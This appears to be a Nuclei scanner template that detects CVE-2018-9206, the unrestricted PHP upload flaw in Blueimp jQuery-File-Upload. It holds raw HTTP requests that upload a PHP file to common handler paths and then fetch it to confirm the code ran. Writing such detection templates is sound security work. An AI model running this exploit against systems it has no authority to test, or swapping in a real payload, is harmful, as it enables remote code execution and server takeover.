id: CVE-2018-9206

info:
  name: Blueimp jQuery-File-Upload <= 9.22.0 - Unrestricted File Upload
  author: flame-11
  severity: critical
  description: |
    Blueimp jQuery-File-Upload versions up to and including 9.22.0 are vulnerable to arbitrary file upload due to insufficient validation in the upload component. This allows unauthenticated remote attackers to upload malicious PHP files which can then be executed on the server, leading to remote code execution. The vulnerability is exploitable when Apache's AllowOverride is set to None (default since Apache 2.3.9), which disables .htaccess protection.
  impact: |
    Successful exploitation allows unauthenticated attackers to upload and execute arbitrary PHP code on the server, leading to complete server compromise.
  remediation: |
    Upgrade to Blueimp jQuery-File-Upload version 9.22.1 or later. Alternatively, remove the server-side upload handlers or restrict file upload capabilities through web server configuration.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2018-9206
    - http://www.vapidlabs.com/advisory.php?v=204
    - https://github.com/blueimp/jQuery-File-Upload/pull/3514
    - https://www.exploit-db.com/exploits/45790/
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2018-9206
    cwe-id: CWE-434
  metadata:
    verified: true
    max-request: 8
    shodan-query: http.html:"jQuery-File-Upload"
  tags: cve,cve2018,jquery,fileupload,rce,intrusive,blueimp

variables:
  marker: "{{rand_base(8)}}"
  filename: "{{rand_base(8)}}.php"
  boundary: "NucleiFormBoundary{{rand_base(12)}}"

flow: http(1) && http(2)

http:
  - raw:
      - |
        POST /{{uploadpath}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----{{boundary}}

        ------{{boundary}}
        Content-Disposition: form-data; name="files[]"; filename="{{filename}}"
        Content-Type: application/octet-stream

        <?php echo 'NUCLEI'.'{{marker}}'.'NUCLEI'; ?>
        ------{{boundary}}--

    payloads:
      uploadpath:
        - ""
        - server/php/index.php
        - server/php/upload.class.php
        - example/upload.php
        - php/index.php
        - upload/server/php/index.php
        - lib/upload/server/php/index.php
        - fileupload/server/php/index.php

    threads: 1
    stop-at-first-match: true

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "{{filename}}")'
          - 'contains(body, "files")'
        condition: and
        internal: true

    extractors:
      - type: json
        name: uploadedurl
        internal: true
        json:
          - '.files[0].url'

  - method: GET
    path:
      - "{{uploadedurl}}"

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "NUCLEI{{marker}}NUCLEI")'
          - '!contains(body, "<?php")'
        condition: and
